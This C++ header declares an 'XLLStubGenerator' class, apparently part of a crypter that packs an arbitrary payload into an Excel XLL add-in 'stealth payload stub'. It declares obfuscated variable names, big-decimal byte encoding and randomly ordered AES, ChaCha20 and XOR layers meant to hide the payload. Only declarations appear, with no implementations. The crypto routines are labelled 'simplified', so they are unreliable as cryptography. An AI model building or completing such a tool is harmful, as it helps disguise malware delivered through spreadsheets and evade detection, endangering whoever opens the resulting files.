#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <algorithm>
#include <thread>
#include <string>

class XLLStubGenerator {
private:
    std::mt19937_64 rng;
    
    // Generate obfuscated variable name
    std::string genVarName();
    
    // Convert bytes to big decimal string
    std::string bytesToBigDecimal(const uint8_t* bytes, size_t length);
    
    // String arithmetic helpers
    std::string addStrings(const std::string& num1, const std::string& num2);
    std::string multiplyStrings(const std::string& num1, const std::string& num2);
    
    // XOR implementation
    void xorData(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen);
    
    // Simplified AES round
    void aesSubBytes(uint8_t state[16]);
    
    // Simplified ChaCha20 round function
    void chacha20QuarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d);
    
public:
    XLLStubGenerator();
    
    struct XLLKeys {
        uint8_t aesKey[16];
        uint8_t aesNonce[16];
        uint8_t chachaKey[32];
        uint8_t chachaNonce[12];
        uint8_t xorKey[32];
        size_t xorKeyLen;
        int encryptionOrder[3]; // 0=AES, 1=ChaCha20, 2=XOR
    };
    
    // Generate keys with maximum entropy
    XLLKeys generateKeys();
    
    // Apply encryption layer
    void applyEncryptionLayer(std::vector<uint8_t>& data, int method, const XLLKeys& keys);
    
    // Generate XLL stealth payload stub
    std::string generateXLLStub(const std::vector<uint8_t>& payload, const XLLKeys& keys);
};